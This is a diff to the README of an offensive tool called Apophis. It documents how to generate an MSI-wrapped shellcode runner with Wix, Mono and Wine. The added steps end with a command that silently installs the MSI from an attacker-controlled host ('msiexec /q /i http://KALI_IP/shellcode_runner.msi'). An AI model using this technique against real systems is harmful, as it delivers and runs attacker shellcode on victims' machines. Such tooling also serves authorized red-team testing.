@@ -35,7 +35,10 @@ chmod +x apophis.sh
 
 ### Download Wix binaries
 
-To generate an ```.MSI``` wrapper, you need first to download the ```Wix binaries``` and unzip it under the ```MSI directory```. 
+To generate an ```.MSI``` wrapper, you need first to download the ```wix311-binaries.zip``` and to unzip it under the ```MSI directory```.
+
+**Note:** The folder MUST have the name ```wix311-binaries```. 
+
 ```
 cd Templates/MSI/
 wget https://github.com/wixtoolset/wix3/releases/download/wix3112rtm/wix311-binaries.zip
@@ -278,13 +281,22 @@ First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesa
 -----
 ### 1.5 Generating MSI
 
-To generate an ```.MSI``` shellcode runner, ```Apophis``` is using ```Mono```,```Wine``` and the ```XML``` template by Adam Chester. If you don't have installed ```Wine```, pls follow the steps described on the ```Installation``` section.
+To generate an ```.MSI``` shellcode runner, ```Apophis``` is using ```Mono```,```Wine``` and the ```XML``` template by Adam Chester. If you don't have  ```Wine``` installed, pls follow the steps described on the ```Installation``` section. 
+
+The created ```shellcode_runner.msi``` is located under ```payloads/MSI/```. To successfully exploit this method, you need to follow the steps:
+
+**Steps**
+- Modify the ```line 16``` on ```Templates/MSI/shellcode_runner.xml```
+- Generate the ```shellcode_runner.msi```
+- Execute it: msiexec /q /i http://KALI_IP/shellcode_runner.msi
 
 **Good read**:
 - https://blog.xpnsec.com/becoming-system/ 
 
 
 ### 1.5.1 Generating MSI (manually)
+
+In case you want to generate manually the MSI, follow the process bellow. 
 
 **Edit the shellcode_runner.xml**
 
